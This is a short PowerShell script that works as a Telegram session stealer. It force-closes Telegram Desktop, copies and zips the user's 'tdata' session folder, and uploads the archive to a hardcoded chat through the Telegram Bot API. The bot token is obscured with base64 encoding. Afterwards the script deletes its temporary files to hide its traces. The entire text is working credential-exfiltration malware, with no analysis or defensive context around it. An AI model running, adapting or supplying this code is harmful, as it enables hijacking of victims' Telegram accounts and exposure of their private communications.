$s=Join-Path $env:APPDATA "Telegram Desktop\tdata"
$t=Join-Path $env:TEMP "tdata_temp_$(Get-Date -Format 'yyyyMMddHHmmss')"
$z=Join-Path $env:TEMP "tdata_$(Get-Date -Format 'yyyyMMddHHmmss').zip"
$a="Nzk5Mzc1NTI1OTpBQUhQRUZSTFY1dmY1T1lvQnNRQjVlbnJSaXpSbC1hNFZKRQo="
$b=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($a))
$c="5047177665"
if(Get-Process Telegram -ErrorAction SilentlyContinue){Stop-Process -Name Telegram -Force;Start-Sleep -Milliseconds 500}
New-Item $t -ItemType Directory -Force|Out-Null
Copy-Item "$s\*" $t -Recurse -Force
Compress-Archive "$t\*" $z -Force
$boundary="----Boundary$(Get-Random)"
$body=("--$boundary`r`nContent-Disposition: form-data; name=`"chat_id`"`r`n`r`n$c`r`n--$boundary`r`nContent-Disposition: form-data; name=`"document`"; filename=`"$(Split-Path $z -Leaf)`"`r`nContent-Type: application/octet-stream`r`n`r`n$([System.IO.File]::ReadAllBytes($z)|%{[char]$_})$([char]13)$([char]10)--$boundary--")
Invoke-RestMethod "https://api.telegram.org/bot$b/sendDocument" -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $body
Remove-Item $t,$z -Recurse -Force -ErrorAction SilentlyContinue
